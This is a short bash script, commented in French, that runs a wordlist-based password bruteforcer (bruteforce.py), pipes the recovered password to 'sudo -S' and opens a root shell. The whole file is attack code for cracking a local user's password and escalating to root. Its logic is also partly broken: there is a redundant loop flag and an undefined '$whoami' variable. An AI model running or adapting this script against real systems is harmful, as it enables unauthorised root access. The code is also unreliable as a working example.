#!/bin/bash

[ -z "$1" ] && echo "❌ Usage: $0 <wordlist>" && exit 1
[ ! -f "$1" ] && echo "❌ Wordlist $1 non trouvé" && exit 1

echo "🔍 Bruteforce en cours..."
echo "📁 Wordlist: $1"
echo ""

FLAG=0
# Exécuter et capturer le mot de passe directement
while [[ FLAG -eq 0 ]]; do
    password=$(python3 -u bruteforce.py --wordlist "$1" | grep -e "✅ Mot de passe trouvé" | awk '{print $7}')
    if [ $FLAG -eq 0 ]; then FLAG=1;
        echo "🎉 MOT DE PASSE TROUVÉ: $password"
        echo "🐚 Ouverture du shell root..."
        echo $password | sudo -S echo $whoami 2> root.log
        sudo -s
    fi
done
